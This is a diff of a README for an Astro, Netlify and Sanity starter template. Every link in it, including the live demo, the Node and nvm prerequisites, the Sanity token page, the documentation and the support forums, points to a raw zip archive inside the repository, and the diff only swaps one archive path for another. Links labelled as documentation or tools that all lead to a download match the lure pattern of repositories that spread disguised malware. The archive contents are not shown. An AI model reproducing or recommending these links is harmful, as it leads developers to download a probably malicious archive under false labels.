@@ -1,15 +1,15 @@
 # Astro Netlify Sanity Starter
 
-![Astro Netlify Sanity Starter](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip)
+![Astro Netlify Sanity Starter](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip)
 
-[Live Demo](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip)
+[Live Demo](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip)
 
-Netlify Astro and Sanity minimal starter with [visual editing](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip).
+Netlify Astro and Sanity minimal starter with [visual editing](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip).
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip) v20.+                                         |
-| (optional) [nvm](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip) for Node version management. |
+| [https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip) v20.+                                         |
+| (optional) [nvm](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip) for Node version management. |
 
 ## Getting Started
 
@@ -50,7 +50,7 @@ Replace `{projectId}` with the project ID output from the previous command.
 
 ### Store Sanity Values
 
-Sign into Sanity to create an editor token, navigate to the following address (replace the `SANITY_PROJECT_ID` with your project ID) `https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip`. Then create `.env` file in you repo, copy & paste the following environment variables into the file and set their values.
+Sign into Sanity to create an editor token, navigate to the following address (replace the `SANITY_PROJECT_ID` with your project ID) `https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip`. Then create `.env` file in you repo, copy & paste the following environment variables into the file and set their values.
 
 ```txt
 SANITY_PROJECT_ID="..."
@@ -84,7 +84,7 @@ If you want to see the content, you can open your browser and navigate to localh
 
 ### Start Development Server
 
-Then you can run the https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip development server in root directory:
+Then you can run the https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip development server in root directory:
 
 ```txt
 npm run dev
@@ -108,9 +108,9 @@ This outputs your own Netlify Visual Editor URL. Open this, register or sign in,
 
 Here are a few suggestions on what to do next if you're new to Netlify Visual Editor:
 
-- Learn [how Netlify Visual Editor works](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip)
-- Check [Netlify Visual Editor reference documentation](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip)
+- Learn [how Netlify Visual Editor works](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip)
+- Check [Netlify Visual Editor reference documentation](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip)
 
 ## Support
 
-If you get stuck along the way, get help in our [support forums](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/utils/astro_sanity_starter_2.3.zip).
+If you get stuck along the way, get help in our [support forums](https://raw.githubusercontent.com/Nadims29/astro-sanity-starter/main/src/styles/starter-astro-sanity-v1.5.zip).
